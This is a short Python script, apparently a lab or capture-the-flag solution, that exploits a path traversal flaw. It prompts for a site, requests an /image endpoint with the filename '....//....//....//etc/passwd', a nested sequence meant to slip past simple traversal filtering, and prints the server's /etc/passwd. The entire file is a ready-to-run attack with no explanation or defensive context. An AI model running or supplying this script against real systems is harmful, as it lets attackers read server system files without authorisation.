import requests

s = requests.Session()

site = input("Provide site link: ")  # Fixed the input line
payload = "....//....//....//etc/passwd"
url = f"https://{site}/image?filename={payload}"  # Constructs the URL
resp = s.get(url)
print(resp.text)